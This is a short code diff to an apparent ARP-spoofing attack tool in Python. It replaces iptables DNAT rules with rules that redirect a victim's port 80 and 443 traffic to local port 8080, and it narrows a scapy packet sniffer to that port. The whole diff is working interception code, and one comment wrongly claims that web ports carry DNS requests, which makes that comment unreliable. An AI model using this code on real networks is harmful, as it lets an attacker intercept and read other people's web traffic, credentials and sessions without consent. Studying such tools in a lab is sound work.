@@ -513,10 +513,13 @@ class ARPP(object):
         self._assure_interface_is_selected()
         
         # Route TCP packets on port 80 or 443 (which includes DNS requests) to 127.0.0.1 which is the local DNS server. 
-        os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 127.0.0.1")
-        os.system("iptables -t nat -A PREROUTING -p tcp --sport 80 -j DNAT --to 127.0.0.1")
-        os.system("iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to 127.0.0.1")
-        os.system("iptables -t nat -A PREROUTING -p tcp --sport 443 -j DNAT --to 127.0.0.1")
+        # os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 127.0.0.1")
+        # os.system("iptables -t nat -A PREROUTING -p tcp --sport 80 -j DNAT --to 127.0.0.1")
+        # os.system("iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to 127.0.0.1")
+        # os.system("iptables -t nat -A PREROUTING -p tcp --sport 443 -j DNAT --to 127.0.0.1")
+        
+        os.system("iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080")
+        os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080")
         
         # get IP of victim as input
         answer = ""
@@ -542,7 +545,7 @@ class ARPP(object):
         def rec(event):
             try:
                 while True:
-                    sniff(timeout=3, count=100, filter="tcp and (port 80 or port 443)", prn=packet_callback, iface=self.SELECTED_INTERFACE)
+                    sniff(timeout=3, count=100, filter="tcp port 8080", prn=packet_callback, iface=self.SELECTED_INTERFACE)
                     if event.is_set():
                         break
             except:
